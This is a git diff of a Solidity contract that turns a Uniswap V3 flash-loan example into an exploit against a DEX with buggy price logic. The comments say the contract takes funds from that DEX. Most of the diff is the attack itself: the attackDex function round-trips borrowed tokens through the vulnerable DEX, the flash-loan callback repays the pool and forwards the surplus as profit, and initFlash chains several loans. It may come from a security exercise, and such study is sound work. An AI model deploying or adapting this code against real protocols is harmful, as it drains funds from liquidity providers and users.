@@ -1,29 +1,44 @@
 // SPDX-License-Identifier: GPL-2.0-or-later
 pragma solidity ^0.8.13;
 
+import {IDex} from "./interfaces/IDex.sol";
 import {console2 as console} from "forge-std/Test.sol";
-import "./interfaces/IFlashLoan.sol";
-import "./lib/CallbackValidation.sol";
-import "./interfaces/IUniswapV3FlashCallback.sol";
+import {IFlashLoan} from "./interfaces/IFlashLoan.sol";
+import {SafeTransferLib, ERC20} from "solmate/utils/SafeTransferLib.sol";
+import {IUniswapV3FlashCallback} from "./interfaces/IUniswapV3FlashCallback.sol";
+import {CallbackValidation, PoolAddress, IUniswapV3Pool} from "./lib/CallbackValidation.sol";
 
-/// @title Flash contract implementation
-/// @notice An example contract using the Uniswap V3 flash function
+/// @title Multiply Flash Contract Implementation
+/// @notice Contract is used to take flash loan from Uniswap V3 flash function and,
+///         take funds from a Dex buggy price logic.
+/// @author c-n-o-t-e
+
 contract FlashLoan is IUniswapV3FlashCallback, IFlashLoan {
     address public immutable factory;
     address public immutable WETH9;
+
+    address constant UNISWAP_TOKEN = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
+    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
 
     constructor(address _factory, address _WETH9) {
         factory = _factory;
         WETH9 = _WETH9;
     }
 
-    // fee2 and fee3 are the two other fees associated with the two other pools of token0 and token1
+    function attackDex(IDex dex, address from) private {
+        uint amount;
 
-    /// @param fee0 The fee from calling flash for token0
-    /// @param fee1 The fee from calling flash for token1
-    /// @param data The data needed in the callback passed as FlashCallbackData from `initFlash`
-    /// @notice implements the callback called from flash
-    /// @dev fails if the flash is not profitable, meaning the amountOut from the flash is less than the amount borrowed
+        ERC20(from).approve(address(dex), 100000 ether);
+        ERC20(UNISWAP_TOKEN).approve(address(dex), 100000 ether);
+
+        amount = ERC20(from).balanceOf(address(this));
+        dex.swap(from, UNISWAP_TOKEN, amount);
+
+        amount = ERC20(UNISWAP_TOKEN).balanceOf(address(this));
+        dex.swap(UNISWAP_TOKEN, from, amount);
+    }
+
+    /// @inheritdoc IUniswapV3FlashCallback
     function uniswapV3FlashCallback(
         uint256 fee0,
         uint256 fee1,
@@ -39,65 +54,63 @@ contract FlashLoan is IUniswapV3FlashCallback, IFlashLoan {
         address token0 = decoded.poolKey.token0;
         address token1 = decoded.poolKey.token1;
 
-        // profitability parameters - we must receive at least the required payment from the arbitrage swaps
-        // exactInputSingle will fail if this amount not met
+        // amount borrowed must be paid with fees
         uint256 amount0Min = decoded.amount0 + fee0;
         uint256 amount1Min = decoded.amount1 + fee1;
 
-        // run logic here
+        address token;
+        uint256 amount;
+
+        // gets the token granted loan and flashloan amount with fee
+        decoded.amount0 > 0
+            ? (token, amount) = (token0, amount0Min)
+            : (token, amount) = (token1, amount1Min);
+
+        attackDex(IDex(decoded.dex), token);
+
+        uint256 contractBalanceAfterAttack = ERC20(token).balanceOf(
+            address(this)
+        );
 
         // pay the required amounts back to the pair
-        // if (amount0Min > 0) pay(token0, address(this), msg.sender, amount0Min);
-        // if (amount1Min > 0) pay(token1, address(this), msg.sender, amount1Min);
+        SafeTransferLib.safeTransfer(ERC20(token), msg.sender, amount);
 
         // if profitable pay profits to payer
-        // if (amountOut0 > amount0Min) {
-        //     uint256 profit0 = amountOut0 - amount0Min;
-        //     pay(token0, address(this), decoded.payer, profit0);
-        // }
-        // if (amountOut1 > amount1Min) {
-        //     uint256 profit1 = amountOut1 - amount1Min;
-        //     pay(token1, address(this), decoded.payer, profit1);
-        // }
+        if (contractBalanceAfterAttack > amount) {
+            uint256 profit0 = contractBalanceAfterAttack - amount;
+            SafeTransferLib.safeTransfer(ERC20(token), decoded.payer, profit0);
+        }
     }
-
-    //fee1 is the fee of the pool from the initial borrow
-    //fee2 is the fee of the first pool to arb from
-    //fee3 is the fee of the second pool to arb from
 
     /// @param params The parameters necessary for flash and the callback, passed in as FlashParams
     /// @notice Calls the pools flash function with data needed in `uniswapV3FlashCallback`
-    function initFlash(FlashParams memory params) external {
-        PoolAddress.PoolKey memory poolKey = PoolAddress.PoolKey({
-            token0: params.token0,
-            token1: params.token1,
-            fee: params.fee1
-        });
+    /// @dev Handles multiply flash loan depending on the length of params
+    function initFlash(FlashParams[] memory params) public {
+        for (uint256 i; i < params.length; ++i) {
+            PoolAddress.PoolKey memory poolKey = PoolAddress.PoolKey({
+                token0: params[i].token0,
+                token1: params[i].token1,
+                fee: params[i].fee1
+            });
 
-        // recheck just in case
-        IUniswapV3Pool pool = IUniswapV3Pool(
-            PoolAddress.computeAddress(factory, poolKey)
-        );
+            IUniswapV3Pool pool = IUniswapV3Pool(
+                PoolAddress.computeAddress(factory, poolKey)
+            );
 
-        console.log(address(pool));
-
-        // recipient of borrowed amounts
-        // amount of token0 requested to borrow
-        // amount of token1 requested to borrow
-        // need amount 0 and amount1 in callback to pay back pool
-        // recipient of flash should be THIS contract
-        pool.flash(
-            address(this),
-            params.amount0,
-            params.amount1,
-            abi.encode(
-                FlashCallbackData({
-                    amount0: params.amount0,
-                    amount1: params.amount1,
-                    payer: msg.sender,
-                    poolKey: poolKey
-                })
-            )
-        );
+            pool.flash(
+                address(this),
+                params[i].amount0,
+                params[i].amount1,
+                abi.encode(
+                    FlashCallbackData({
+                        amount0: params[i].amount0,
+                        amount1: params[i].amount1,
+                        payer: msg.sender,
+                        poolKey: poolKey,
+                        dex: params[i].dex
+                    })
+                )
+            );
+        }
     }
 }
